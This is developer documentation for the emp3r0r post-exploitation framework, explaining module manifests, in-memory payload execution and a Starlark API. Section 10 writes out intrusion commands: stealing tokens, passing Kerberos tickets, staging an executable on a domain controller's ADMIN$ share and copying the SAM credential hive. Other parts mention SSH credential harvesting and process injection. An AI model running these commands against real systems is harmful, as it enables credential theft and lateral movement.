# Writing emp3r0r Modules

A module is a directory containing a `config.json` manifest plus its payload
sources. At startup the C2 scans its module directories, parses every
manifest, and registers each entry as a top-level console command. When the
operator invokes that command the C2 hosts the payload, sends the agent a
`!custom_module` job, and the agent runs the payload **in memory**.

There are two kinds of modules:

- **Agent modules** run on the target. `agent_config.type` is one of:
  - `coff` — a Windows COFF/BOF or Linux relocatable object,
  - `starlark` — a script for the embedded Starlark engine,
  - `dll` — a Windows DLL mapped into the agent process, or
  - `so` — a Linux shared-library dependency used by other modules.

  The payload is never written to disk and no interpreter or child process is
  spawned on the target. DLL/SO modules can also be declared as `dependencies`
  of another module; see §8.

- **C2 modules** (`"is_local": true`) run on the operator host. They execute
  their `build` command on the C2 and are used to produce payloads
  (`loader_windows`, `stager_linux`, `crystal_pack`). They have no
  `agent_config`. Because they never reach an agent, they run without a
  selected target and their `platform` field (when set) is informational
  only — it describes the OS the produced payload targets, not where the
  module runs.

The built-in commands (`listener`, `file_downloader`,
`steal_token`, `list_tokens`, `list_sessions`) are Go code registered
internally. They are not defined by a manifest and are not covered here.

---

## 1. Minimal Starlark module

A minimal Starlark manifest:

```json
{
  "name": "procinfo",
  "comment": "Display detailed information of a Linux process",
  "platform": "Linux",
  "parameters": [
    {
      "name": "pid",
      "description": "PID of target process",
      "default": "",
      "type": "int"
    }
  ],
  "agent_config": {
    "files": ["run.star"],
    "type": "starlark"
  }
}
```

A minimal `run.star`:

```python
def main(*args):
    pid = args[0] if args and args[0] else "self"
    status = read_file("/proc/%s/status" % pid)
    print(status)
    return "OK"
```

From the console, with an agent selected:

```text
procinfo --pid 1234
```

What happens:

- `agent_config.files[0]` is the entry script.
- The C2 validates the flags (see §4) and sends the script to the agent.
- The agent runs it with the embedded Starlark engine. `main(*args)` is
  called with the resolved arguments; a non-`None` return value is appended
  to the output. `print()` output is returned to the operator.
- No interpreter is needed on the target.

---

## 2. Minimal BOF module

A minimal BOF manifest (based on `hello_linux`):

```json
{
  "name": "hello_linux",
  "build": "make",
  "comment": "Linux BOF Hello World",
  "platform": "Linux",
  "parameters": [
    {
      "name": "who",
      "description": "Who to greet",
      "default": "World",
      "type": "cstr"
    }
  ],
  "agent_config": {
    "files": ["hello_linux.o"],
    "type": "coff"
  },
  "invocation": {
    "coff_export": "go"
  }
}
```

```text
hello_linux --who friend
```

- `coff_export` is the exported BOF entry point. It is **required** for
  `coff` modules; without it the agent reports "missing COFF invocation
  data".
- `agent_config.files` may list several architecture variants
  (`foo.x64.o`, `foo.x86.o`). The C2 picks the one matching the target agent's
  architecture and hosts it as `<name>.<arch>.gz`.
- On Windows the agent runs the BOF through the `coffloader` dependency, which
  is added to `dependencies` automatically. On Linux it runs through the native
  ELF object loader. See §8 for how dependencies are mapped and unmapped.

---

## 3. Directory layout and discovery

Modules live under `core/modules/`. A module can be standalone:

```text
core/modules/hello_linux/
├── config.json
├── Makefile
└── hello_linux.c
```

or a suite of related modules sharing one manifest and source tree:

```text
core/modules/SA/
├── config.json
├── Makefile
├── whoami.star
├── uptime.star
└── ...
```

At startup the C2 scans these directories in order:

1. `<EMP_DATA_DIR>/modules` (installed modules),
2. `<EmpWorkSpace>/modules` (operator workspace).

Later directories override earlier ones. A directory is a module only if it
contains a `config.json`; the manifest may be a single object or an array of
objects (a suite).

Shared headers and helpers live in `core/modules/bof_common/` (BOF headers)
and `core/modules/common/` (cross-platform C sources such as RC4 and the
indirect-syscall stubs). The C2 copies both into the operator workspace so
module build scripts can reference them by relative path.

A file watcher reloads changed manifests at runtime and re-registers the
affected commands, so you usually do not need to restart the C2 after editing
a `config.json`.

---

## 4. `config.json` reference

A manifest is a single module object or an array of module objects.

### Top-level fields

| Field                | Required              | Meaning                                                                                                                                                                                                                        |
| -------------------- | --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `name`               | yes                   | Console command name. Must be unique.                                                                                                                                                                                          |
| `comment`            | strongly recommended  | One-line description shown in module help and `search`.                                                                                                                                                                        |
| `author`, `date`     | no                    | Metadata only.                                                                                                                                                                                                                 |
| `is_local`           | no (default `false`)  | `true` runs the module on the C2 instead of dispatching to an agent.                                                                                                                                                           |
| `platform`           | yes for agent modules | `Linux`, `Windows`, or `Generic` (case-insensitive). At run time the C2 rejects the module unless it matches the agent's OS or is `Generic`.                                                                                   |
| `path`               | no                    | Filled in by the C2 with the module's working copy. Leave empty.                                                                                                                                                               |
| `build`              | no                    | Shell command the C2 runs in the module directory on **every invocation**, with the current flags appended as `--name 'value'` (sorted by name). Required for local modules; also usable to rebuild a payload before dispatch. |
| `dependencies`       | no                    | Other modules whose DLL/SO payloads must be hosted for the target architecture before dispatch (see §8). Windows `coff` modules get `coffloader` added automatically.                                                          |
| `module_files_memfs` | no                    | `starlark` only: upload every file in `agent_config.files` except the entry script to encrypted memfs and expose the paths to the script as `module_files`.                                                                    |
| `parameters`         | no                    | Command options (see below).                                                                                                                                                                                                   |
| `agent_config`       | agent modules         | Payload configuration.                                                                                                                                                                                                         |
| `invocation`         | no                    | How parameters become argv / BOF / DLL calls.                                                                                                                                                                                  |

### `agent_config`

| Field   | Meaning                                                                                                                                                                                                                                                   |
| ------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `type`  | `coff`, `starlark`, `dll`, or `so`. A manifest with any other type (or an empty type on a non-local module) is rejected at load time.                                                                                                                     |
| `files` | Payload files, relative to the module directory. For `starlark`, `files[0]` is the entry script. For `coff`/`dll`/`so`, list per-architecture variants (`.x64.o`/`.x86.o`, `x64.dll`/`x86.dll`, `libbpf.so`); the C2 selects by the agent's architecture. |
| `exec`  | Only meaningful for built-in Go modules, which use `"built-in"`. Custom modules may omit it; the entry is `files[0]`.                                                                                                                                     |

### `parameters`

Each parameter becomes a `--name` flag on the generated console command and a
value in the module invocation.

| Field         | Meaning                                                                                                                                                 |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `name`        | Flag name, used as `--name value`.                                                                                                                      |
| `description` | Help text. **Required** — a parameter without a description makes the whole manifest fail to load.                                                      |
| `default`     | Value used when the operator omits the flag.                                                                                                            |
| `type`        | Value type and, for BOFs, wire format (see §5). For `starlark` this is informational; scripts receive raw strings.                                      |
| `required`    | Reject the invocation when the value is empty. Enforced for every module type.                                                                          |
| `choices`     | Restrict the value to one of a fixed list. Enforced for `coff`/`dll`, **not** for `starlark`.                                                           |
| `min`, `max`  | Numeric bounds, enforced for `int`/`uint`/`short` on `coff`/`dll` modules. Not enforced for `starlark`.                                                 |
| `argv_flag`   | Prefix inserted before the value when building the argv list, e.g. `--user`. Only affects `starlark`; BOF arguments are packed from the type, not argv. |

Avoid the name `help` for a parameter: it collides with the built-in
`--help` flag.

### `invocation`

| Field            | Meaning                                                                                                                                                                                                        |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `argv`           | Literal tokens prepended to the argument list, e.g. `[{"literal": "download"}]` for a script that dispatches on its first argument. Parameters are appended after these in declaration order. `starlark` only. |
| `coff_export`    | BOF entry point. Required for `coff` modules. Use `go` for Beacon-compatible BOFs.                                                                                                                             |
| `dll_entry`      | BOF entry point used by a `dll` module's loader. Defaults to `go`.                                                                                                                                             |
| `dll_file_param` | Name of the parameter that holds the BOF file path to run under a `dll` module. Defaults to `file`.                                                                                                            |

The in-memory DLL loader always calls the DLL's `LoadAndRun` export; it is not
configurable.

---

## 5. Parameter types and BOF wire format

For `coff` and `dll` modules the parameter `type` drives both C2-side
validation and COFF argument packing. Arguments are packed in declaration
order.

| Type value                                                | Wire token | Packed as                                                  |
| --------------------------------------------------------- | ---------- | ---------------------------------------------------------- |
| `int`, `int32`, `uint32`, `uint`, `dword`, `port`, `bool` | `i`        | 32-bit integer                                             |
| `short`, `int16`, `word`                                  | `s`        | 16-bit integer                                             |
| `cstr`, `string`, `str`, `lpstr`                          | `z`        | UTF-8 C string                                             |
| `wstr`, `wstring`, `lpwstr`, `w`                          | `Z`        | UTF-16LE wide string                                       |
| `binary`, `base64`                                        | `b`        | Length-prefixed binary blob (base64-decoded when possible) |

The single-character tokens `z`, `Z`, `i`, `s`, `b` are also accepted.
An unrecognized type is not validated at load time but makes the in-memory
argument packer fail when the module runs, so stick to the table.

Notes:

- Every declared BOF argument is packed, even when the operator leaves it
  empty, so the BOF always receives a well-formed argument list. Empty numeric
  values are packed as zero and empty strings as empty strings.
- `argv_flag` is ignored for BOF arguments (they are packed directly) and only
  affects `starlark` argv.
- Starlark is dynamically typed: its `main(*args)` receives every parameter as
  a positional string, in declaration order, and the script does its own
  `int()`/`bool()` conversion. The C2 only checks `required` for Starlark
  parameters — `choices`, `min`, `max` and `type` are **not** applied, so a
  Starlark module that needs strict input validation must do it itself.

---

## 6. Building modules

`core/build.py` scans `core/modules/*/make_all.sh` and runs each one
automatically; you do not need to edit `build.py` to add a module. A minimal
build script:

```bash
#!/bin/bash
set -e
make -C src/MyBof -j"$(nproc)"
```

Keep compiled artifacts in the source tree and reference them by relative path
in `agent_config.files`. Do not copy them elsewhere.

`make_all.sh` is for suites that need compiling ahead of time. A single-file
Starlark module needs no build step.

The `build` manifest field is separate: it is a command the C2 runs
immediately before each execution, with the current flags appended, and is
used by local C2 modules (`loader_windows` uses `bash ./build.sh`). Toolchain
requirements for those modules are documented in their own READMEs; the
Windows loader, for example, needs zig (installed by `build.py`), `nasm`, and a
native C compiler.

---

## 7. What happens when a module runs

On the C2 (`moduleCustom`):

1. If `build` is set, run it in the module directory with the current flags.
2. If `is_local` is true, stop — the module ran on the C2 with no target
   required and no platform check (see §1).
3. Resolve and validate the invocation from the console flags.
4. Pre-host every `dependencies` payload for the target architecture so a
   missing dependency fails fast.
5. Compress the selected payload with gzip into `WWWRoot` and send the agent a
   `!custom_module` job:

   ```text
   !custom_module --mod_name <name> --type <type> \
     --file_to_download <hosted.gz> --checksum <sha256> \
     --invocation <base64 CBOR> [--peer <ip>]
   ```

   For a multi-file Starlark module (`module_files_memfs`), the companion
   files are hosted too and listed in the invocation.

On the agent (`ModuleHandler`):

1. Download the payload and verify its SHA256 (three attempts), caching it in
   encrypted memfs.
2. Gunzip it.
3. Cache companion files in memfs and expose their paths as `module_files`.
4. Resolve `--token` / `--user` / `--ticket` into a token context (Windows).
5. Dispatch by `--type`:
   - `starlark` — `script.Run(payload, argv, {module_files}, token)`.
   - `coff` — run the BOF through the in-memory `coffloader` dependency
     (Windows) or the native ELF loader (Linux).
   - `dll` — map the DLL and call its `LoadAndRun` export for the BOF named by
     `dll_entry`.
   - `so` — a shared-library dependency (e.g. `libbpf`). It is fetched on
     demand by the `ebpf_*` builtins; invoking it directly reports that it is a
     dependency.

The agent never extracts a module to disk and never spawns a child process.
Dependency mapping and teardown are covered in §8.

---

## 8. Dependency modules (DLL/SO)

A module may declare `dependencies`: other modules whose payload is a DLL
(`.dll`) or shared object (`.so`) rather than something that runs on its own.
Windows `coff` modules always depend on `coffloader`; Linux eBPF modules depend
on `libbpf`.

The C2 only builds and hosts each dependency as `<name>.<arch>.gz`; the agent
decides when to map it. That decision lives in one place — **`core/lib/memdeps`**
— so every dependency follows the same rule: **map on use, unmap on return.**
A dependency image is never left resident in cleartext once the operation that
needed it has finished.

### Resolution

The agent wires the resolver once, in `core/internal/agent/modules/mod.go`:

```go
func init() {
	memdeps.SetResolver(fetchDependency)
}
```

`fetchDependency` checks the encrypted memfs cache first
(`memfs:///<name>.dll` on Windows, `memfs:///<name>.so` elsewhere), then
downloads and decompresses the C2-hosted `<name>.<arch>.gz` and writes it back
to memfs. The extension comes from `dependencyExt()`. Bytes are never stored in
the clear.

### Mapping

`memdeps` exposes two entry points:

| Function                | Behavior                                                               |
| ----------------------- | ---------------------------------------------------------------------- |
| `memdeps.Use(name, fn)` | Resolve the named dependency, map it, run `fn(*memmod.Module)`, unmap. |
| `memdeps.Run(data, fn)` | Map caller-supplied bytes, run `fn`, unmap.                            |

Both map with `memmod.LoadLibrary` and **unconditionally** `defer module.Free()`
around the callback, so the image is released on success, on error, and on
panic. The `*memmod.Module` passed to `fn` is valid only inside the callback and
must not escape; the raw bytes stay in memfs and are re-fetched on demand.

Every dependency consumer goes through this layer:

| Consumer                           | Path                                                            |
| ---------------------------------- | --------------------------------------------------------------- |
| Windows `coff` modules             | `coffloader.RunCOFFDependency` → `memdeps.Use("coffloader", …)` |
| `dll` modules / explicit DLL bytes | `coffloader.RunWindowsCOFFViaDLL` → `memdeps.Run(dllData, …)`   |
| Linux eBPF builtins                | `libbpf.WithLibrary` → `memdeps.Use("libbpf", …)`               |

Scripts that map a library themselves with `mem_load_library` are covered too:
their handles live in a per-run registry (`runModules` in
`core/lib/script/api_mem_native.go`), and `script.Run` calls `releaseRunModules`
before returning, freeing anything the script did not `mem_free`. See
`core/lib/memdeps/README.md` for the package-level details.

The point of the indirection is that no caller can hold a mapping it might
cache; a dependency image exists only while its user is executing.

---

## 9. Starlark API

Starlark is a small deterministic Python dialect. The agent embeds the engine,
so no interpreter is installed on the target. There is no standard library and
`load()` is not wired up.

### Strings

| Function                                               | Description                                                           |
| ------------------------------------------------------ | --------------------------------------------------------------------- |
| `sprintf(format, *args)`                               | `fmt.Sprintf` formatting (`%016x`, `%-30s`, ...).                     |
| `hex(value)`                                           | Integer to a `0x...` string.                                          |
| `str_split(s, sep)`                                    | Split into a list.                                                    |
| `str_join(elements, sep)`                              | Join any iterable of strings.                                         |
| `str_replace(s, old, new, n=-1)`                       | Replace up to `n` occurrences.                                        |
| `str_contains(s, substr)`                              | Substring test.                                                       |
| `str_trim(s, cutset="")`                               | Trim whitespace, or any character in `cutset`.                        |
| `str_lower(s)`, `str_upper(s)`                         | Case conversion.                                                      |
| `str_startswith(s, prefix)`, `str_endswith(s, suffix)` | Prefix/suffix test.                                                   |
| `str_pad(text, width)`, `pad(text, width)`             | Pad to a column width; right for positive `width`, left for negative. |
| `str_index(s, substr)`                                 | Index of a substring, or `-1`.                                        |

Starlark's native `%` string formatting and `"".join(...)` also work; the
helpers above are convenience wrappers.

### Files and network

| Function                                   | Description                                                                                                                                                                                                       |
| ------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `read_file(path, default=...)`             | Read a file as a string. `memfs:///` paths hit encrypted memfs. If `default` is given, it is returned instead of raising on a read error, which is useful for best-effort reads (Starlark has no `try`/`except`). |
| `write_file(path, content)`                | Write a text file (mode `0644`).                                                                                                                                                                                  |
| `write_bytes(path, data)`                  | Write string/bytes; returns the number of bytes written.                                                                                                                                                          |
| `list_dir(path)`                           | List a real directory merged with memfs keys under the path.                                                                                                                                                      |
| `exists(path)`                             | Whether a path exists.                                                                                                                                                                                            |
| `mkdir(path)`                              | Create directories on the real filesystem (no memfs equivalent).                                                                                                                                                  |
| `remove(path)`                             | Delete a file/directory (memfs-aware).                                                                                                                                                                            |
| `read_link(path, default=...)`             | Target of a symlink, e.g. a `/proc/<pid>/ns` entry. With `default`, a vanished or racy symlink returns the default instead of raising (Starlark has no `try`/`except`).                                           |
| `http_get(url)`                            | HTTP GET, returns the response body as a string.                                                                                                                                                                  |
| `http_post(url, content_type, body)`       | HTTP POST with a string body, returns the response body.                                                                                                                                                          |
| `crypto_hash(algo, data)`                  | Hex digest; `algo` is `md5`, `sha1`, or `sha256`.                                                                                                                                                                 |
| `bytes_to_b64(data)` / `b64_to_bytes(b64)` | Binary-safe base64 round trip.                                                                                                                                                                                    |

### Memory reads

All take `(address, offset=0)` and read little-endian. On a read fault they
return `0` / `""` rather than raising.

`read_u8`/`read_uint8`, `read_u16`/`read_uint16`, `read_u32`/`read_uint32`,
`read_u64`/`read_uint64`/`read_ptr`, `read_i32`/`read_int32`, and the
null-terminated readers `read_wstring(address, max_len=256)` (UTF-16) and
`read_cstring(address, max_len=256)` / `read_ansi_string`.

### Memory writes and allocators

`write_byte`/`write_u8`/`write_uint8`, `write_u16`/`write_uint16`,
`write_u32`/`write_uint32`, `write_u64`/`write_uint64`/`write_ptr` take
`(address, val)` or `(address, offset, val)`. Faults are ignored.

`utf16_ptr(s)`, `cstring_ptr(s)` and `ansi_ptr(s)` allocate unmanaged memory
holding an encoded NUL-terminated copy of `s` and return its address.

### Windows interop

| Function                                | Description                                                                                                                                            |
| --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `win_call(dll, function, *args)`        | Call an exported DLL function. Arguments may be int, string (passed as a UTF-16 pointer), bool, or `None`. Returns a dict `{r1, r2, err_code, error}`. |
| `win_alloc(size)` / `win_free(address)` | `VirtualAlloc`/`VirtualFree`; `win_free(0)` is a no-op.                                                                                                |
| `win_read_mem(address, size)`           | Read process memory as a list of byte values.                                                                                                          |
| `current_token()`                       | Handle to the current effective token (thread token, then process token); `0` on failure. Close it with `win_call("kernel32.dll", "CloseHandle", h)`.  |

These are only meaningful on Windows; on other platforms they return an error.

### Linux syscalls

| Function                                | Description                                                                                                                           |
| --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| `sys_call(number_or_name, *args)`       | `syscall.Syscall6`; accepts up to 6 arguments. Strings become C strings, lists become byte buffers. Returns `{r1, r2, errno, error}`. |
| `sys_alloc(size)` / `sys_free(address)` | Anonymous `mmap`/`munmap`; `sys_free` only frees addresses returned by `sys_alloc`.                                                   |
| `sys_read_mem(address, size)`           | Read memory as a list of byte values.                                                                                                 |

Aliases: `lin_syscall`/`linux_syscall`, `lin_alloc`/`linux_alloc`,
`lin_free`/`linux_free`, `lin_read_mem`/`linux_read_mem`.

These are only available on Linux; on other platforms they return an error.

### Capabilities

Linux scripts check what the process is actually allowed to do instead of
assuming root, so a privileged task is attempted when its capability is held
and skipped when it is not (running as root simply means every capability is
held). Both builtins read `/proc/self/status`.

| Function        | Description                                                                                                                       |
| --------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| `get_caps()`    | Process capability sets as `{inheritable, permitted, effective, bounding, ambient}` lists of `CAP_*` names.                       |
| `has_cap(name)` | `True` when `name` (e.g. `"CAP_BPF"`, `"CAP_SYS_ADMIN"`, `"CAP_SYS_MODULE"`) is in the effective set. Unknown names are an error. |

Only available on Linux; on other platforms they return an error.

### In-memory shared libraries (Windows and Linux)

| Function                                    | Description                                                                                                                                       |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mem_load_library(data)` / `mem_load(data)` | Map a shared library image into the current process; returns its base address as a handle. Accepts a PE DLL on Windows and an ELF `.so` on Linux. |
| `mem_proc_address(module, name)`            | Address of a named export.                                                                                                                        |
| `mem_proc_ordinal(module, ordinal)`         | Address of an export by ordinal (Windows only; ELF libraries have no ordinal table).                                                              |
| `mem_base_addr(module)`                     | Base address of a loaded module.                                                                                                                  |
| `mem_free(module)`                          | Unload a module and drop its handle.                                                                                                              |

A library the script does not `mem_free` is released by `releaseRunModules`
when the run ends (see §8), so a mapped DLL/SO never outlives its user.

On Linux the loader supports `386`, `amd64`, and `arm64`. Other platforms return a
"not supported on this platform" error. Resolving a `.so`'s dynamic dependencies
(libc, libelf, libz, ...) requires the **shared-object agent** (`stub-<arch>.so`)
loaded into a process that provides them; the standalone `-static-pie` agent
does not support dynamic loading.

### eBPF (Linux shared-object agents)

Backed by `core/lib/libbpf`, whose `WithLibrary` maps the `libbpf` dependency
through `memdeps` for the duration of each builtin call (see §8). Enumeration
needs `CAP_BPF`/`CAP_SYS_ADMIN`; without it the lists come back empty.

| Function                                                               | Description                                                                                                                                                                                                                                                                                                                                                                                                           |
| ---------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ebpf_progs()`                                                         | List kernel BPF programs as `{id, type, name, load_time, jited_len, nr_maps}` dicts.                                                                                                                                                                                                                                                                                                                                  |
| `ebpf_links()`                                                         | List kernel BPF links as `{id, type, prog_id, prog_type}` dicts.                                                                                                                                                                                                                                                                                                                                                      |
| `ebpf_maps()`                                                          | List kernel BPF maps as `{id, type, name, key_size, value_size, max_entries}` dicts.                                                                                                                                                                                                                                                                                                                                  |
| `ebpf_detach(id)`                                                      | Detach the BPF link with the given id.                                                                                                                                                                                                                                                                                                                                                                                |
| `ebpf_map_wipe(id)`                                                    | Delete every element of the BPF map with the given id; returns `{id, deleted, error}` (Furtex wipe_maps).                                                                                                                                                                                                                                                                                                             |
| `ebpf_code_offset(path, pattern)`                                      | Find a hex `pattern` in the executable segments of an ELF and return `{offset, vaddr, error}`; `offset` is the file offset a uprobe attaches to.                                                                                                                                                                                                                                                                      |
| `ebpf_uprobe_capture(image, path, offset, prog, reg, pid, timeout_ms)` | Load an in-memory BPF object, attach `prog` as a uprobe at `path:offset` (a negative `pid` covers all processes mapping the binary), and return `{events, error}`. Each event is `{pid, uid, retval, comm, arg}` where `arg` is the NUL-terminated string read from register `reg` (x86_64 order: `RAX, RDI, RSI, RDX, RCX, R8, R9, RBP, RSP, RBX, R12, R13, R14, R15`). The libbpf mapping and probe exist only for the duration of the call. |
| `ebpf_uprobe_start(image, path, offset, prog, reg, pid, timeout_ms, out_path)` | Start a long-lived uprobe capture that outlives the script run. Returns `{id, out_path, error}` immediately. Every event is appended to `out_path` (an encrypted memfs path; generated when omitted) and streamed to the operator through the run's `notify` sender. `timeout_ms=0` keeps it running until stopped. Exactly one capture per module may run at a time. |
| `ebpf_uprobe_stop(id, owner)` | Cancel the matching capture (by `id`, or by `owner`, defaulting to the calling module), wait for teardown, and return `{events, out_paths, error}`. |
| `ebpf_uprobe_sessions()` | List live/finished captures as `{sessions, error}`, each `{id, owner, out_path, path, pid, running}`. |

### Signed kernel drivers (Windows)

| Function                        | Description                                                          |
| ------------------------------- | -------------------------------------------------------------------- |
| `driver_load(path, name)`       | Install and start a signed `.sys` from an absolute path.             |
| `driver_load_bytes(data, name)` | Drop the image to `System32\drivers`, load it, then delete the file. |
| `driver_unload(name)`           | Stop the driver and remove its service key.                          |
| `driver_is_loaded(name)`        | Whether the service key exists.                                      |
| `driver_is_signed(path)`        | Offline Authenticode check with `WinVerifyTrust`.                    |

Only signed drivers are supported; no DSE bypass is attempted. On non-Windows
platforms these return a "not supported" error.

### Streaming to the operator

| Function        | Description                                                                                                                                                                                                 |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `notify(message)` | Send `message` to the operator immediately instead of buffering it until the script returns. The module handler wires the sender; standalone tools and tests drop it. Useful for long-running work. |

The agent injects the `notify` sender when it dispatches a module; a script can
call it directly. Long-lived builtins such as `ebpf_uprobe_start` capture the
same sender and keep streaming after the script returns.

### The `agent` module

Every function is available both as `agent.foo()` and as a top-level
`agent_foo()` alias:

| Function                                                      | Description                                                                                                                           |
| ------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| `sys_info()`                                                  | Dictionary of agent details (`tag`, `uuid`, `os`, `goos`, `arch`, `user`, `has_root`, `process`, `cwd`, `ips`, ...).                  |
| `uptime()`                                                    | Uptime string.                                                                                                                        |
| `user()`                                                      | Dict `{user, groups}`.                                                                                                                |
| `container()`                                                 | Container name, or empty.                                                                                                             |
| `has_root()`                                                  | Whether the agent is root/SYSTEM.                                                                                                     |
| `sign(data)`                                                  | Sign with the agent's ephemeral key; returns bytes.                                                                                   |
| `tag()`, `uuid()`                                             | Agent identifiers.                                                                                                                    |
| `touch_file(path)`                                            | Sync a file's timestamps with its source.                                                                                             |
| `fetch_file(file_to_download, peer="", path="", checksum="")` | Fetch a file through the memfs/P2P/C2 pipeline. Returns bytes, or `None` when `path` is supplied (the file is written there instead). |

### Globals

- `argv` — the resolved argument list (same values passed to `main`).
- `module_files` — memfs paths of a multi-file module's companion files, in
  `agent_config.files` order (empty for single-file modules).

### Entry point

```python
def main(*args):
    who = args[0] if args else "World"
    print("Hello %s!" % who)
    return "OK"
```

The engine calls `main(*args)` if it is defined. `print()` output and a
non-`None` return value are sent back to the operator. A script that returns
`None` produces no result line.

---

## 10. Windows identity: tokens, sessions, and tickets

For Windows agent modules of type `starlark`, `coff` or `dll`, the C2 injects
three universal options (`steal_token` gets only `--token`; `list_tokens` and
`list_sessions` get none):

| Option                       | Meaning                                                                                         |
| ---------------------------- | ----------------------------------------------------------------------------------------------- |
| `--token <SID\|session>`     | Run under a stolen token (`steal_token`/`list_tokens`) or a netlogon session (`list_sessions`). |
| `--user <DOMAIN/user>`       | Create or reuse a netonly netlogon session and run under it. Ignored when `--token` is set.     |
| `--ticket <base64 KRB-CRED>` | Import a `.kirbi` ticket into the module's logon session before running.                        |

Supporting commands:

| Command                   | Description                                                                                   |
| ------------------------- | --------------------------------------------------------------------------------------------- |
| `steal_token --pid <PID>` | Duplicate and cache a process token; enables `SeDebugPrivilege` and `SeImpersonatePrivilege`. |
| `list_tokens`             | List cached tokens and netlogon sessions.                                                     |
| `list_sessions`           | List netlogon sessions created via `--user`.                                                  |

There is no separate `make_token` or `import_ticket` command: the session is
created and the ticket imported as part of the module invocation.

### How impersonation reaches the module

- **Starlark** builtins that do I/O (`read_file`, `win_call`, `http_get`, ...)
  wrap each call in `runWithToken`, which locks the OS thread, sets the thread
  token with an indirect `NtSetInformationThread`, performs the operation, and
  reverts. No script changes are needed.
- **BOF/DLL** payloads run on a dedicated goroutine with a pre-exec hook that
  sets the thread token and a post-exec hook that clears it, so any Win32 call
  the payload makes sees the impersonated identity.

### Netlogon sessions and pass-the-ticket

Kerberos APIs are bound to a logon session in LSASS, not to a token. `--user`
creates a _netonly_ (new-credentials) session — the same primitive as Cobalt
Strike's `make_token` or `runas /netonly`. The password is never validated
(the agent supplies a dummy value), and the session keeps the caller's local
identity while lending the supplied credentials to outbound network
connections.

Typical pass-the-ticket flow:

```text
kerbeus_klist --user CORP.LOCAL/jdoe --ticket <base64 TGT>
kerbeus_asktgt --params '/user:jdoe ... /ptt' --token CORP.LOCAL/jdoe
```

The first command creates the netonly session and imports the ticket; the
second reuses that session by name. Without an imported ticket, network
access falls back to the (dummy-password) netonly credentials and fails
against remote resources.

### SMB/CIFS to agent-less hosts

The `cifs` suite moves files directly to machines that run no agent, over
their `ADMIN$`/`C$` shares:

```text
cifs_upload --src memfs:///stage.exe --dest '\\DC01\ADMIN$\Temp\stage.exe' \
  --token <DA token>
cifs_download --src '\\DC01\C$\Windows\system32\config\SAM' \
  --dest memfs:///SAM --user CORP.LOCAL/da --ticket <base64 kirbi>
cifs_rm --dest '\\DC01\ADMIN$\Temp\stage.exe'
```

Every `CreateFileW`/`WriteFile` call impersonates the assigned token, so the
SMB redirector authenticates with the stolen identity or the imported ticket.
Pair with the `scshell` BOF to execute an uploaded file on the target.

---

## 11. Examples to copy from

| Module                          | Demonstrates                                                                                                               |
| ------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| `hello_linux`                   | Minimal Linux BOF and `config.json`.                                                                                       |
| `procinfo`                      | Minimal Linux Starlark module that reads `/proc`.                                                                          |
| `SA/`                           | A suite of Windows Starlark modules, including token inspection in `whoami.star`.                                          |
| `cifs/`                         | Token/ticket-aware SMB I/O.                                                                                                |
| `kkyum/`                        | Multi-file Starlark module loading a kernel driver from a companion `.sys` cached in memfs (`module_files_memfs`).         |
| `injection/`                    | Remote thread injection under an operator-selected token.                                                                  |
| `coffloader/`                   | The Windows in-memory COFF loader DLL (`dll` module).                                                                      |
| `libbpf/`                       | Builds a self-contained `libbpf.so` (zig) used by the Go `core/lib/libbpf` loader and the `ebpf_*` builtins.               |
| `ssh_harvest/`                  | eBPF uprobe credential capture: zig-compiled BPF object + `ebpf_code_offset`/`ebpf_uprobe_start`/`ebpf_uprobe_stop` from a Starlark module.                                        |
| `loader_windows/`               | A local C2 module that builds a self-unpacking loader.                                                                     |
| `CS-Situational-Awareness-BOF/` | A large third-party BOF suite imported as-is; every command is a top-level console command with one flag per BOF argument. |
| `C2-Tool-Collection/`           | BOF suite with `choices`/`required` flags and a `make_all.sh` that builds a nested `BOF/` tree.                            |
| `SQL-BOF/`                      | SQL Server BOF suite; fixed-value wrapper commands over a shared `togglemodule` BOF and a `binary` (base64) parameter.     |

---

## 12. Troubleshooting

| Symptom                                                | Likely cause                                                                                                                               |
| ------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `missing COFF invocation data`                         | `invocation.coff_export` is not set on a `coff` module.                                                                                    |
| Module registered but never runs; "does not support …" | `platform` does not match the agent OS and is not `Generic`. Only applies to agent modules — local (`is_local`) modules are exempt.        |
| Manifest fails to load                                 | A parameter has no `description`, or a non-local module's `agent_config.type` is missing or not `coff`/`starlark`/`dll`/`so`.              |
| `option X is required`                                 | The flag was empty and the parameter is `required`.                                                                                        |
| Starlark receives the wrong values                     | Starlark parameters are positional strings in declaration order; remember that `argv`/`main` include any `invocation.argv` literals first. |
| `unknown arg prefix` / `unsupported COFF wire type`    | A BOF parameter uses a `type` not listed in §5.                                                                                            |
